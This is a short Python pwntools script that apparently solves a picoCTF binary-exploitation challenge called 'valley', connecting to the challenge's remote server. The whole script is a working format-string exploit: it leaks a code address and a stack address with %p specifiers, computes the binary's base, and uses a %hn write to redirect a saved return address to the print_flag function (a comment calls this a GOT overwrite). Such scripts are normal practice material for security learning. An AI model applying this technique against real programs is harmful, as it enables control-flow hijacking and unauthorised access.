#!/usr/bin/env python3

from pwn import *

exe = ELF("./valley", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("shape-facility.picoctf.net", 51614)

# input()

# Leak base address
p.sendlineafter(b'\n', b'%21$p')
p.recvuntil(b'distance: ')
leak = int(p.recvuntil(b'\n', drop=True), 16)
print("Leak address: " + hex(leak))
base_addr = leak - 0x1413
print("Base address: " + hex(base_addr))

# Leak stack address
p.sendline(b'%9$p')
p.recvuntil(b'distance: ')
stack_leak = int(p.recvuntil(b'\n', drop=True), 16)
print("Stack leak: " + hex(stack_leak))

# GOT overwrite
main_18_addr = stack_leak + 0x30
win = (exe.sym['print_flag'] + base_addr) & 0xffff
payload = f'%{win}c%8$hn'.encode()
payload = payload.ljust(16, b'a')
payload += p64(main_18_addr)
p.sendline(payload)

p.sendline(b'exit')

p.interactive()